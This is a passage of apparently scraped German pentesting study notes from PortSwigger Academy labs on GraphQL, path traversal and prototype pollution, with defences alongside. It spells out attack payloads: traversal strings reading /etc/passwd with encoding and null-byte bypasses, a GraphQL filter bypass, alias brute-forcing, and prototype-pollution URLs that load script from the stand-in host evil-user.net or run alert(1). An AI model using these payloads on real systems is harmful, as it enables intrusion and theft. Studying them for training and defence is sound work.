<code>__schema</code> anf\u00fcgen. - Oder POST in GET \u00e4ndern - Oder POST Request mit Content-Type <code>x-www-form-urlencoded</code> <code>GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D</code></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/3.%20Attack%20API/#lab-finding-a-hidden-graphql-endpoint","title":"Lab: Finding a hidden GraphQL endpoint","text":"<ol> <li>API Endpunkte finde durch manuelles testen m\u00f6glich</li> <li>Schauen ob der Endpunkte queries nimmt</li> <li>Jetzt k\u00f6nnen wir mit unserer InQL Extension einen introspection query setzen{ width=\"675\" }</li> <li>Wir stellen fest der Server hat einen Filter dagegen</li> <li>Filter umgehbar mit einfachen<code>%0a(New line)</code> </li> <li>Dann geschaut was es so gibt und folgendes gefunden. </li> <li>Wir schicken das an unsere <code>Target-&gt;Site map</code> um zu schauen welche API queries es gibt.</li> <li>Dann beide Requests an den Repeater und Variable-Feld decoded, bearbeitet und wieder encoded</li> <li>Mit dem einen querie konnten wir user auslesen und deren ID(Variable in Smart Decoder um die ID manuell zu \u00e4ndern)</li> <li>Mit der anderen Querie konnten wir dann User l\u00f6schen anhand ihrer ID</li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/3.%20Attack%20API/#rate-limit-umgehen","title":"Rate Limit umgehen","text":"<ul> <li>GraphQL ist ein Post-Request, der viele Fragen in einem Request beantworten kann.</li> <li>Alias = du gibst einer Frage in derselben Anfrage einen neuen Namen, damit du dieselbe Frage mehrfach stellen kannst.</li> <li>Viele Server z\u00e4hlen nur Anfragen pro Minute (z. B. 100 Requests/min). Wenn du aber in einem Request 50 Fragen packst, z\u00e4hlt das immer noch als 1 Request \u2014 ergo: du kannst mehr ausprobieren, ohne das Rate-Limit auszul\u00f6sen.</li> </ul> <p>z. B. </p><pre><code>query {\n  a: isValidDiscount(code: \"CODE1\") { valid }\n  b: isValidDiscount(code: \"CODE2\") { valid }\n  c: isValidDiscount(code: \"CODE3\") { valid }\n}\n</code></pre> Server z\u00e4hlt 1 HTTP-Request, macht aber 3 Pr\u00fcfungen. Damit kann man z.B. viele Rabattcodes auf einmal ausprobieren.<p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/3.%20Attack%20API/#lab-bypassing-graphql-brute-force-protections","title":"Lab: Bypassing GraphQL brute force protections","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/3.%20Attack%20API/#grapgql-csrf","title":"GrapgQL CSRF","text":"<p>TODO:</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/4.%20Preventing%20GraphQL%20Attacks/","title":"4. Preventing GraphQL Attacks","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/4.%20Preventing%20GraphQL%20Attacks/#absicherung-einer-graphql-api-allgemein","title":"Absicherung einer GraphQL-API (Allgemein)","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/4.%20Preventing%20GraphQL%20Attacks/#1-introspection-deaktivieren-wenn-moglich","title":"1. Introspection deaktivieren (wenn m\u00f6glich)","text":"<ul> <li>Wenn deine API nicht \u00f6ffentlich ist \u2192 Introspection ausschalten.     So kann niemand mehr das komplette Schema auslesen oder versteckte Felder entdecken</li> <li>Wenn sie \u00f6ffentlich ist \u2192 Introspection aktiv lassen, aber pr\u00fcfen, dass das Schema keine sensiblen Felder enth\u00e4lt (z. B. <code>passwordHash</code>, <code>email</code>, <code>token</code>, <code>userId</code>).</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/4.%20Preventing%20GraphQL%20Attacks/#2-suggestions-deaktivieren","title":"2. Suggestions deaktivieren","text":"<ul> <li>\u201eDid you mean \u2026?\u201c-Vorschl\u00e4ge (Suggestions) d\u00fcrfen nicht aktiv sein, weil sie Angreifern verraten, welche Felder im Schema existieren.</li> <li>Apollo erlaubt kein direktes Abschalten \u2192 es gibt aber Workarounds (z. B. \u00fcber <code>formatError()</code> in der Server-Konfiguration, siehe GitHub-Thread).</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/4.%20Preventing%20GraphQL%20Attacks/#3-keine-privaten-felder-veroffentlichen","title":"3. Keine privaten Felder ver\u00f6ffentlichen","text":"<ul> <li>Das Schema darf keine sensiblen Userdaten enthalten (z. B. E-Mail, interne IDs, Rollen).</li> <li>\u00dcberpr\u00fcfe, was der Resolver wirklich zur\u00fcckgibt \u2013 auch bei Introspection oder public Queries.</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/4.%20Preventing%20GraphQL%20Attacks/#schutz-vor-brute-force-und-dos-angriffen","title":"Schutz vor Brute-Force- und DoS-Angriffen","text":"<p>Angreifer k\u00f6nnen z. B. mit Aliases viele Anfragen in einem Request stellen oder durch verschachtelte Queries den Server \u00fcberlasten. \u2192 Gegenma\u00dfnahmen:</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/4.%20Preventing%20GraphQL%20Attacks/#1-query-tiefe-begrenzen","title":"1. Query-Tiefe begrenzen","text":"<ul> <li>Setze ein Limit, wie tief Queries verschachtelt werden d\u00fcrfen (z. B. max. 5 Ebenen).</li> <li>Damit verhinderst du zu komplexe / rekursive Anfragen, die den Server lahmlegen k\u00f6nnen.</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/4.%20Preventing%20GraphQL%20Attacks/#2-operation-limits-konfigurieren","title":"2. Operation-Limits konfigurieren","text":"<ul> <li>Beschr\u00e4nke:<ul> <li>Anzahl der Felder</li> <li>Anzahl der Aliases</li> <li>Anzahl der Root-Felder     pro Anfrage.     \u2192 So kann niemand 1000 Operationen in einem Request verstecken.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/4.%20Preventing%20GraphQL%20Attacks/#3-maximale-query-groe-bytes-festlegen","title":"3. Maximale Query-Gr\u00f6\u00dfe (Bytes) festlegen","text":"<ul> <li>Jede Query darf nur bis zu einer bestimmten Gr\u00f6\u00dfe (z. B. 10 KB) haben.     \u2192 Schutz gegen riesige Requests.</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/4.%20Preventing%20GraphQL%20Attacks/#4-kostenanalyse-cost-analysis-aktivieren","title":"4. Kostenanalyse (Cost Analysis) aktivieren","text":"<ul> <li>Jeder Field-Resolver bekommt einen \u201eKostenfaktor\u201c.</li> <li>Wenn eine Query zu teuer wird (z. B. zu viele Felder oder tiefe Strukturen), wird sie abgewiesen.</li> <li>In Apollo kannst du das mit Libraries wie <code>graphql-cost-analysis</code> oder <code>graphql-query-complexity</code> umsetzen.</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/4.%20Preventing%20GraphQL%20Attacks/#csrf-schutz-fur-graphql","title":"CSRF-Schutz f\u00fcr GraphQL","text":"<ol> <li>Nur POST mit JSON akzeptieren     \u2192 Keine GET- oder Form-Submits.</li> <li>Content-Type pr\u00fcfen     \u2192 Anfrage muss <code>Content-Type: application/json</code> haben.</li> <li>CSRF-Token verwenden     \u2192 Klassisches Anti-CSRF-Verfahren (Token, das bei jedem Request mitgeschickt und \u00fcberpr\u00fcft wird).</li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/GraphQL%20Checkliste/","title":"11) Wie du das in Burp / GraphiQL testest (kurz)","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/GraphQL%20Checkliste/#11-wie-du-das-in-burp-graphiql-testest-kurz","title":"11) Wie du das in Burp / GraphiQL testest (kurz)","text":"<ul> <li>Finde Endpoint (<code>/graphql</code>, <code>/api/graphql</code>, <code>/graphiql</code>)</li> <li>Aktiviere/injecte Requests in Burp Intruder oder Repeater</li> <li>F\u00fchre Introspection (InQL) \u2192 Schema ziehen</li> <li>Suche nach Mutations \u2192 teste mit unterschiedlichen <code>variables</code></li> <li>Teste Depth (Rekursion), Limits, Batch Requests</li> <li>Teste fehlende Auth: entferne/wechsel Authorization Header, setze andere Token</li> </ul> <p>Tools: InQL (Burp), GraphQLmap, GraphiQL, GraphQL Voyager.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/GraphQL%20API/GraphQL%20Checkliste/#12-schnelle-checkliste-pen-test","title":"12) Schnelle Checkliste (Pen-Test)","text":"<ul> <li>Endpoint gefunden? (auch GraphiQL/Playground)</li> <li>Introspection m\u00f6glich? (ja \u2192 recon)</li> <li>Sind sensitive Felder offen? (<code>password</code>, <code>token</code>, <code>secret</code>)</li> <li>IDOR bei <code>id</code>/<code>resource</code> Parametern?</li> <li>Mutations gepr\u00fcft? (create/update/delete)</li> <li>Depth / Cost Limit getestet?</li> <li>Input-Sanitization / SQLi gepr\u00fcft?</li> <li>Logging, rate-limit, auth enforcement vorhanden?</li> <li>Batch / file upload / subscriptions gepr\u00fcft?</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Path%20traversal/1.%20Path%20Traversal/","title":"1. Path Traversal","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Path%20traversal/1.%20Path%20Traversal/#was-ist-path-traversal","title":"Was ist Path traversal","text":"<p>Auch bekannt als Directory Traversal. Mit der kann man im schlimmsten Fall Zugriff zu Files au\u00dferhalb des Webseiten-Bereichs erreichen und sogar das System oder die komplette App ver\u00e4ndern.</p> <ul> <li>Application code and data.</li> <li>Credentials for back-end systems.</li> <li>Sensitive operating system files.</li> </ul> <p>z. B. eine Seite l\u00e4dt ein Bild wie folgt. </p><pre><code>&lt;img src=\"/loadImage?filename=218.png\"&gt;\n</code></pre><p></p> <p>dann k\u00f6nnte man das wie folgt nutzen <code>https://insecure-website.com/loadImage?filename=../../../etc/passwd</code> <code>https://insecure-website.com/loadImage?filename=..\\..\\..\\windows\\win.ini</code></p> <p>Manchmal muss man die Pfade auch etwas anpassen.  z. B. <code>....//....//....//etc/passwd</code> <code>etc/passwd</code></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Path%20traversal/1.%20Path%20Traversal/#bypassing-sanatization","title":"Bypassing Sanatization","text":"<p>Encoding Mit URL Encoding kann man den gew\u00fcnschten Pfad auch wieder encoden um solche sanitizations zu bypassen <code>..%252f..%252f..%252fetc/passwd</code> oder auch als ganzes <code>%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32fetc/passwd</code> oder auch komplett inkl. etc/passwd encoden.</p> <p>Expected Base Pfad Manchmal kann es auch sein, dass ein Mechanismus verlangt, dass es mit einem bestimmten Base Pfad startet. Das sieht dann wie folgt aus. z. B. <code>/var/www/images</code> dann setzen wir sowas wie. <code>filename=/var/www/images/../../../etc/passwd</code></p> <p>[!note] Tool-Tipp Hackvertor Extension verwenden zum encoden</p> <p>{ width=\"700\" } Expected File Extension Ebenfalls gilt das f\u00fcr Dateiendungen. Es kann z. B. sein, dass nur <code>.png</code> verwendet werden darf. Dann baut man sowas wie: <code>filename=../../../etc/passwd%00.png</code> - <code>%00</code>: bedeutet Nullbyte also <code>\\0</code> und bei vielen Low-Level C API's gilt das als Ende der Zeichenkette.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Path%20traversal/2.%20Preventing%20Path%20Traversal/","title":"2. Preventing Path Traversal","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Path%20traversal/2.%20Preventing%20Path%20Traversal/#wie-verhindert-man-path-traversal","title":"Wie verhindert man Path Traversal","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Path%20traversal/2.%20Preventing%20Path%20Traversal/#schutz-1-eingabe-validieren","title":"Schutz 1: Eingabe validieren","text":"<ul> <li>Eingabe \u00fcberpr\u00fcfen und schauen, dass nur die n\u00f6tigsten Zeichen erlaubt sind. Gegebenenfalls mit RegEx. <pre><code>if (!userInput.matches(\"^[a-zA-Z0-9._-]+$\")) {\n    throw new SecurityException(\"Invalid filename\");\n}\n</code></pre></li> <li>Pfade Whitelisten und \u00fcberpr\u00fcfen ob der Pfad in der Whitelist enthalten ist. <pre><code>if (!allowedFiles.contains(userInput)) {\n    return \"Access denied\";\n}\n</code></pre></li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Path%20traversal/2.%20Preventing%20Path%20Traversal/#schutz-2-pfad-kanonisieren-vereinheitlichen","title":"Schutz 2: Pfad \u201ekanonisieren\u201c (vereinheitlichen)","text":"<p>Selbst beim validieren k\u00f6nnte man mit diversen Tricks wie auch URL-Encoding Schlupfl\u00f6cher finden lassen. </p> <p>Darum: 1. Basis Verzeichnis anh\u00e4ngen 2. Pfad kanonisieren(aufl\u00f6sen nach Pfad) 3. Und dann den Pfad Validieren</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Path%20traversal/Checkliste%20Path%20Traversal/","title":"Checkliste Path Traversal","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Path%20traversal/Checkliste%20Path%20Traversal/#checkliste","title":"Checkliste","text":"<ol> <li>Pr\u00fcfen ob irgendwo Pfade aufgerufen werden z. B. wenn Bilder oder andere Inhalte geladen werden.</li> </ol> <pre><code>&lt;img src=\"/loadImage?filename=218.png\"&gt;\n</code></pre> <p><code>....//....//....//etc/passwd</code></p> <p>Linux/Win <code>https://insecure-website.com/loadImage?filename=../../../etc/passwd</code> <code>https://insecure-website.com/loadImage?filename=..\\..\\..\\windows\\win.ini</code></p> <p>Bypasses: - Expected Base Pfad <code>filename=/var/www/images/../../../etc/passwd</code> - Expected File Extension <code>filename=../../../etc/passwd%00.png</code> - Encoding <code>..%252f..%252f..%252fetc/passwd</code></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/1.%20Prototype%20Pollution/","title":"1. Prototype Pollution","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/1.%20Prototype%20Pollution/#was-ist-protoype-pollution","title":"Was ist Protoype Pollution","text":"<p>Ist eine JavaScript-Schwachstelle die es einem Angreifer erm\u00f6glicht Eigenschaften von einem globalen Objekt hinzuf\u00fcgen welche dann wiederum auch von Objekten geerbt werden. Meistens wird das mit anderen Schwachstellen verkn\u00fcpft.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/1.%20Prototype%20Pollution/#was-ist-ein-objekt-in-javascript","title":"Was ist ein Objekt in Javascript","text":"<p>Eine Kollektion von <code>Key:Value</code> Paaren auch genannt \"Properties\" </p><pre><code>const user = { \n    username: \"wiener\", \n    userId: 01234, \n    isAdmin: false \n}\n</code></pre><p></p> <p>Man kann auf die Paare entweder mit Punkt oder Klammer Notation aufrufen </p><pre><code>user.username // \"wiener\"\nuser['userId'] // 01234\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/1.%20Prototype%20Pollution/#was-sind-prototypes-in-js","title":"Was sind Prototypes in JS","text":"<ul> <li> <p>Definition: Ein Prototype ist ein Objekt, von dem ein anderes Objekt erbt. Jede Instanz hat einen internen Verweis (<code>[[Prototype]]</code>) auf ihr Prototype-Objekt.</p> </li> <li> <p>Kette (Prototype Chain): Wenn du <code>obj.foo</code> liest, sucht JS erst auf <code>obj</code>, dann auf dessen Prototype, dann weiter die Kette hoch - bis <code>null</code>. z. B.  </p><pre><code>class User {\n  greet() { return \"Hi \" + this.name; } // liegt auf User.prototype\n}\nconst u = new User();\nu.name = \"Nico\";\nu.greet(); // \"Hi Nico\"\n</code></pre><p></p> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/1.%20Prototype%20Pollution/#prototype-chain","title":"Prototype Chain","text":"<p>Alles in Javascript sind technisch gesehen Objekte die alle beliebig miteinader vererbt sind.   </p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/1.%20Prototype%20Pollution/#zugriff-auf-prototyp-objekt-mit-__proto__","title":"Zugriff auf Prototyp-Objekt mit <code>__proto__</code>","text":"<p>Man kann mit <code>__proto__</code> von jedem Objekt auf seinen Prototyp zugreifen. - Die Eigenschaft fungiert als Setter als auch als Getter </p><pre><code>username.__proto__\nusername[`__proto__`]\n</code></pre><p></p> <pre><code>username.__proto__                        // String.prototype\nusername.__proto__.__proto__              // Object.prototype\nusername.__proto__.__proto__.__proto__    // null\n</code></pre>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/1.%20Prototype%20Pollution/#prototypen-andern","title":"Prototypen \u00e4ndern","text":"<p>Obwohl es schlechte Praxis ist, ist es m\u00f6glich in JS den Prototypen zu \u00e4ndern. Dabei lassen sich sogar neue Methoden hinzuf\u00fcgen. z. B. Modernes JS bietet <code>trim()</code> f\u00fcr Strings, aber bevor es diese Methode gab, haben Entwickler teilweise ihre eigene gebaut und erg\u00e4nzt - somit hatte jeder String ebenfalls Zugriff auf die Methode.</p> <p>fr\u00fcher: </p><pre><code>String.prototype.removeWhitespace = function(){\n    // f\u00fchrende und nachfolgende Leerzeichen entfernen\n}\n</code></pre> <pre><code>let searchTerm = \"  example \";\nsearchTerm.removeWhitespace();    // \"example\"\n</code></pre><p></p> <p>heute: </p><pre><code>let searchTerm = \"  example \";\nsearchTerm.trim();    // \"example\"\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/","title":"2. Schwachstellen & L\u00f6sungen","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#was-passiert-bei-prototype-pollution-ganz-simpel","title":"Was passiert bei Prototype-Pollution \u2013 ganz simpel","text":"<ul> <li>Stell dir vor, alle JS-Objekte bekommen ihre F\u00e4higkeiten aus einem gemeinsamen Bauplan (dem Prototype).</li> <li>Ein Angreifer schickt dir Daten (z. B. per URL oder JSON), in denen heimlich ein spezieller Schl\u00fcssel steckt: <code>__proto__</code>.</li> <li>Deine App merged diese Daten rekursiv in ein bestehendes Objekt \u2013 ohne vorher die Schl\u00fcssel zu pr\u00fcfen.</li> <li>Weil <code>__proto__</code> in JS magisch ist, landet das, was darunter steht, nicht im normalen Objekt, sondern im Bauplan (Prototype).</li> <li>Ergebnis: Alle Objekte erben pl\u00f6tzlich diese neuen (b\u00f6sen) Eigenschaften \u2192 unerwartetes Verhalten, XSS, RCE-Ketten usw.</li> </ul> <p>Erfolgreiche Ausnutzung von Prototype-Pollution erfordert im Wesentlichen: - Quelle (source): Eine Eingabe, die es erlaubt, Prototypen mit beliebigen Properties zu vergiften. - Senke (sink): Eine JS-Funktion oder ein DOM-Element, das beliebige Codeausf\u00fchrung erm\u00f6glicht. - Gadget: Eine Property, die ungefiltert in eine Senke flie\u00dft.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#wie-verhindert-man-das","title":"Wie verhindert man das?","text":"<ul> <li>Gef\u00e4hrliche Schl\u00fcssel blocken (egal wie tief): <code>__proto__</code>, <code>prototype</code>, <code>constructor</code>.</li> <li>Schema pr\u00fcfen (Ajv) und <code>additionalProperties: false</code>.</li> <li>Sicher mergen (bew\u00e4hrte Library mit Proto-Schutz oder eigener Guard):</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#prototype-pollution-quellen","title":"Prototype-Pollution-Quellen","text":"<p>Eine Quelle ist jede benutzerkontrollierte Eingabe, die erlaubt, beliebige Properties zu Prototypen hinzuzuf\u00fcgen. H\u00e4ufige Quellen sind:</p> <ul> <li>Die URL \u00fcber Query-String oder Fragment (Hash)</li> <li>JSON-basierte Eingaben    </li> <li>Web Messages (postMessage)</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#prototype-pollution-uber-die-url","title":"Prototype-Pollution \u00fcber die URL","text":"<p>Betrachte folgende URL mit einem vom Angreifer konstruierten Query-String: </p><pre><code>https://vulnerable-website.com/?__proto__[evilProperty]=payload\n</code></pre><p></p> <pre><code>{\n    existingProperty1: 'foo',\n    existingProperty2: 'bar',\n    __proto__: {\n        evilProperty: 'payload'\n    }\n}\n</code></pre> <pre><code>targetObject.__proto__.evilProperty = 'payload'\n</code></pre>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#prototype-pollution-uber-json","title":"Prototype-Pollution \u00fcber JSON","text":"<p>Benutzerkontrollierte Objekte werden oft aus einem JSON-String mit <code>JSON.parse()</code> erzeugt. Spannend: <code>JSON.parse()</code> behandelt jeden Key als ganz normalen String \u2013 auch <code>__proto__</code>. Dadurch entsteht ein weiterer Angriffsvektor f\u00fcr Prototype Pollution.</p> <p>Beispiel: Ein Angreifer schickt (z. B. per Web Message) dieses JSON: </p><pre><code>{\n  \"__proto__\": {\n    \"evilProperty\": \"payload\"\n  }\n}\n</code></pre><p></p> <p>Wird das mit <code>JSON.parse()</code> in ein Objekt umgewandelt, enth\u00e4lt das Ergebnis tats\u00e4chlich eine eigene Property mit dem Key <code>__proto__</code>:</p> <pre><code>const objectLiteral = { __proto__: { evilProperty: 'payload' } };\nconst objectFromJson = JSON.parse('{\"__proto__\": {\"evilProperty\": \"payload\"}}');\n\nobjectLiteral.hasOwnProperty('__proto__');     // false\nobjectFromJson.hasOwnProperty('__proto__');    // true\n</code></pre> <p>Wenn dieses per <code>JSON.parse()</code> erzeugte Objekt anschlie\u00dfend ohne Key-Sanitizing in ein bestehendes Objekt gemerged wird, f\u00fchrt das \u2013 wie beim URL-Beispiel \u2013 zur Prototype Pollution: Die verschachtelten Properties landen beim Prototyp (z. B. <code>Object.prototype</code>) statt beim Zielobjekt.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#prototype-pollution-sinks","title":"Prototype pollution sinks","text":"<p>Ein Sink ist eine JavaScript-Funktion oder ein DOM-Element, das du indirekt \u00fcber Prototype Pollution beeinflussen kannst - und \u00fcber das sich dann beliebiger JS-Code (client-seitig) oder sogar Systembefehle (server-seitig, z. B. Node.js) ausf\u00fchren lassen.  Da Prototype Pollution dir Zugriff auf sonst unerreichbare Eigenschaften gibt, kommst du unter Umst\u00e4nden an zus\u00e4tzliche Sinks in der Ziel-App heran. Entwickler, die das Risiko nicht kennen, halten diese Properties oft f\u00fcr nicht benutzerkontrollierbar \u2013 entsprechend gibt es kaum Filterung/Sanitizing.</p> <p>Typische Beispiele (ohne Exploit-Details): - Client (DOM/XSS): <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write</code>, unsichere Template-Renderer, jQuery-APIs wie <code>.html()</code>, dynamische Event-Handler. - Allgemeines JS: dynamische Ausf\u00fchrung \u00fcber <code>Function(...)</code>, <code>setTimeout(\"...\")</code> (String-Variante), gef\u00e4hrliche Template-Interpolation. - Server (Node.js): Konfig-Flags/Optionen, die zu Command-Execution oder Pfad-Manipulation f\u00fchren k\u00f6nnen (z. B. wenn Libraries intern Shell/FS-Operationen anhand von Options-Properties ausf\u00fchren).</p> <p>[!tip]- In Dumm erkl\u00e4rt: Was ist ein Sink? Ein Sink ist einfach eine gef\u00e4hrliche Stelle/Operation, die problematisch wird, wenn angreiferkontrollierte Daten hineinflie\u00dfen. Das kann eine JS-Funktion, ein DOM-API, ein Template-Renderer, ein Dateipfad-Joiner, etc. sein.</p> <p>Warum passt Prototype Pollution dazu?    Durch Prototype Pollution kannst du sonst interne/\u201eunsteuerbare\u201c Properties beeinflussen. Wenn der Code diese Property in einen Sink steckt, passiert der Schaden (z. B. DOM XSS oder sogar RCE in Node). Die Ausf\u00fchrung wirkt \u201eintern\u201c, weil sie im Kontext der Anwendung l\u00e4uft (Rechte/Cookies/Origin), nicht im fremden Tab.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#prototype-pollution-gadgets","title":"Prototype pollution gadgets","text":"<p>Ein Gadget ist eine Property, mit der sich eine Prototype-Pollution in einen echten Exploit verwandeln l\u00e4sst. Damit etwas ein Gadget ist, m\u00fcssen beide Punkte gelten: 1. Unsichere Nutzung: Die Property wird sp\u00e4ter gef\u00e4hrlich verwendet (z. B. ungefiltert an einen Sink wie <code>innerHTML</code>, <code>Function</code>, Dateipfad-Join, etc. \u00fcbergeben). 2. Angreifer-kontrollierbar: Das betroffene Objekt erbt die Property \u00fcber den Prototyp (also nicht lokal definiert), sodass der Angreifer ihren Wert via Pollution setzen kann.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#idee","title":"Idee","text":"<ul> <li>Eine Library liest Optionen aus <code>config</code>.</li> <li> <p>Wenn <code>config.transport_url</code> nicht gesetzt ist, nimmt sie einen Default:     <code>let transport_url = config.transport_url || defaults.transport_url;</code></p> </li> <li> <p>Sp\u00e4ter l\u00e4dt sie damit ein Script:     <code>let script = document.createElement('script'); script.src = `${transport_url}/example.js`; document.body.appendChild(script);</code></p> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#wo-ist-das-gadget","title":"Wo ist das Gadget?","text":"<ul> <li>Gadget-Property: <code>transport_url</code></li> <li>Wenn <code>config</code> keine eigene <code>transport_url</code>-Property hat, erbt es die vom Prototype.</li> <li>Prototype Pollution kann per URL passieren:     <code>https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net</code>     \u2192 Dann wird <code>script.src</code> zu <code>//evil-user.net/example.js</code> (oder was der Angreifer will).</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#direktes-xss-per-data-url","title":"Direktes XSS per <code>data:</code>-URL","text":"<ul> <li>Statt einer Domain kann der Angreifer eine <code>data:</code>-URL setzen, die sofort Code ausf\u00fchrt:     <code>https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//</code></li> <li>Das <code>//</code> am Ende kommentiert den fest eingebauten Suffix <code>/example.js</code> weg.</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#warum-funktionierts","title":"Warum funktioniert\u2019s?","text":"<ul> <li><code>config.transport_url</code> ist nicht definiert \u2192 Ausdruck nutzt linke Seite (falsy) und f\u00e4llt auf <code>defaults</code> zur\u00fcck\u2026 ABER: durch Pollution existiert geerbtes <code>transport_url</code> \u2192 wird als wahr gewertet und genutzt.</li> <li>Ergebnis: Fremde URL landet in <code>script.src</code> (Sink) \u2192 fremdes Script/XSS.</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#fix-kurz","title":"Fix (kurz)","text":"<ul> <li>Nur eigene Properties akzeptieren:     <code>const hasOwn = Object.hasOwn(config, 'transport_url'); let transport_url = hasOwn ? config.transport_url : defaults.transport_url;</code></li> <li>Oder <code>config</code> als Null-Prototyp anlegen:     <code>const config = Object.create(null);</code></li> <li>Beim Merge Proto-Keys blocken: <code>__proto__</code>, <code>prototype</code>, <code>constructor</code>.</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/Prototype%20Pollution/2.%20Schwachstellen%20%26%20L%C3%B6sungen/#client-seitige-prototype-pollution-quellen-finden-manuell","title":"Client-seitige Prototype-Pollution: Quellen finden (manuell)","text":"<p>Ziel: Irgendeine Property auf <code>Object.prototype</code> einschleusen. 1. Payloads ausprobieren (Query, Hash, JSON): </p><pre><code>https://vulnerable-website.com/?__proto__[foo]=bar\nhttps://vulnerable-website.com/?__proto__.foo=bar\n</code></pre><p></p> <ol> <li>Im Browser-Console pr\u00fcfen: <pre><code>Object.prototype.foo\n// \"bar\"  \u2192 Erfolg\n// undefined \u2192 nicht geklappt\n</code></pre></li> <li>Varianten testen</li> <li>Punkt- vs. Klammer-Notation wechseln</li> <li>Andere Eingabepfade: <code>location.hash</code>, <code>postMessage</code>/Web-Messages, JSON\u2010Bodies</li> <li>(Falls nix klappt: sp\u00e4ter via <code>constructor</code> probieren.)</li> 